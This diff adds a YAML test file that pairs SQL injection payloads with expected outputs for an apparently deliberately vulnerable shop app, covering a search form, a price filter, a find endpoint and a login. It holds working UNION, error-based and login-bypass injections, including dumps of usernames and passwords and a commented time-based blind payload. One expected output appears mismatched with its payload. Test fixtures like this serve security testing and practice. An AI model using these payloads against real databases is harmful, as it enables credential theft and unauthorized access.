@@ -1,0 +1,144 @@
+# https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+search_by_price:
+# "SELECT * FROM items WHERE price <= $max";
+  functional_test:
+    test_name_01:
+      payload: "1.00"
+      expected: "Cherry   1.00 €"
+    test_name_02:
+      payload: "3.00"
+      expected: " - Apple   2.00 €  - Orange   3.00 €  - Cherry   1.00 € "
+# payload is an INTEGER, which meas that escaped "'" does not matter in this seeting with real_escape_string()
+  union:
+    attack_01:
+      payload: "1 UNION SELECT NULL,version()-- -"
+      expected: "5.7.42"
+    attack_02:
+    # This can help with mapping the filesystem
+      # 1%20UNION%20SELECT%20NULL%2C%40%40global.version_compile_os--%20-
+      payload: "1 UNION SELECT NULL,@@global.version_compile_os-- -"
+      expected: "Linux"
+  error_based:
+    attack_01:
+      payload: "1 AND ExtractValue(0, CONCAT( 0x5c, User())) -- -"
+      expected: "root@"
+    attack_02:
+      payload: "1 AND ExtractValue(0, CONCAT( 0x5c, @@version)) -- -"
+      expected: "5.7.42"
+    attack_03:
+    # 1%20UNION%20SELECT%201%2C%20CONCAT(username%2C%20'%3A'%2C%20password)%2C%203%20FROM%20users%20WHERE%20'1'%20%3D%20'1'%20--%20-
+      payload: "1 UNION SELECT 1, CONCAT(username, ':', password), 3 FROM users WHERE '1' = '1' -- -"
+      expected: "/var/lib/mysql/"
+
+search:
+# SELECT * FROM items WHERE name LIKE '%$search%'
+
+  # So normal usecase?
+  functional_test:
+    test_name_01:
+      payload: "Apple"
+      expected: "Apple   2.00 €"
+    test_name_02:
+      payload: "Orange"
+      expected: "Orange   3.00 €"
+    test_name_03:
+      payload: ""
+      expected: " - Apple   2.00 €  - Orange   3.00 €  - Cherry   1.00 € "
+  union:
+    attack_01:
+      payload: "%' UNION SELECT NULL,version()-- -"
+      expected: "5.7.42"
+    attack_02:
+    # %25'%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--%20-
+      payload: "%' UNION SELECT username, password FROM users -- -"
+      expected: "admin"
+  error_based:
+    attack_01:
+    # %25'%20AND%20ExtractValue(0%2C%20CONCAT(%200x5c%2C%20User()))%20--%20-
+      payload: "%' AND ExtractValue(0, CONCAT( 0x5c, User())) -- -"
+      expected: "root@"
+    attack_02:
+    # %25'%20AND%20ExtractValue(0%2C%20CONCAT(%200x5c%2C%20%40%40version))%20--%20-
+      payload: "%' AND ExtractValue(0, CONCAT( 0x5c, @@version)) -- -"
+      expected: "5.7.42"
+    attack_03:
+      payload: "%;'"
+      expected: "MySQL"
+
+# SELECT * FROM items WHERE name='$search'
+# Propably a better way to do this is to use regex so that we can use the same payload for all the tests regardless of price
+find:
+  functional_test:
+    test_name_01:
+      payload: Apple
+      expected: Apple   2.00 €
+    test_name_02:
+      payload: Orange
+      expected: Orange   3.00 €
+    test_name_03:
+      payload:
+      expected: Warning
+      # expected: "- Apple   2.00 €
+      #           - Orange   3.00 €
+      #           - Cherry   1.00 € "
+  union:
+    attack_01:
+      payload: "' UNION SELECT NULL,version()-- -"
+      expected: "5.7.42"
+    attack_02:
+      payload: "\" UNION SELECT NULL as price,@@version as name-- -"
+      expected: "5.7.42"
+  error_based:
+    attack_01:
+      payload: "' AND ExtractValue(0, CONCAT( 0x5c, User())) -- -"
+      expected: "root@"
+    attack_02:
+      payload: "' AND ExtractValue(0, CONCAT( 0x5c, @@version)) -- -"
+      expected: "5.7.42"
+
+# What about buffer overflow?
+# Blind SQL injection e.g. SELECT * FROM users WHERE id=$id 
+# payload : 1 AND (X)
+
+# Time-based Blind SQL Injection
+# You send a payload. If the payload  works then wait, if not then dont wait
+# IF (ORD(MID((SELECT user FROM mysql.user LIMIT 0,1), 1, 1)) > 0x61, sleep(5), 0) -- -
+
+# SQLMap tool
+
+# SELECT * FROM items WHERE name='$search' AND sleep(5)
+login:
+# Limit the output to pass number_row check
+# -- -
+# OR
+# OFFSET 0
+# SELECT * FROM users WHERE username='admin' AND password='$pass'
+  functional_test:
+    test_name_01:
+      payload: [admin, password]
+      expected: Welcome admin!
+    test_name_02:
+      payload: [admin, wrong_password]
+      expected: Wrong username or password
+  # just a simple test
+  union:
+    attack_00:
+      payload: ["admin", "\\'"]
+      expected: "admin"
+    attack_01:
+      payload: ["admin", "' OR '1'='1"]
+      expected: "admin"
+    attack_02:
+      payload: ["-- -", "-- -"]
+      expected: "admin"
+    attack_03:
+      payload : ["wololo", "'  '1' = '1' UNION SELECT 1, 1, 1,version() as password-- -"]
+      expected: "5.7.42"
+    attack_04:
+      payload: ["wololo", "' UNION SELECT NULL,NULL, NULL,version()-- -"]
+      expected: "5.7.42"
+  error_based:
+    attack_01:
+      payload: ["wololo", "' AND ExtractValue(0, CONCAT( 0x5c, User())) -- -"]
+      expected: "root@"
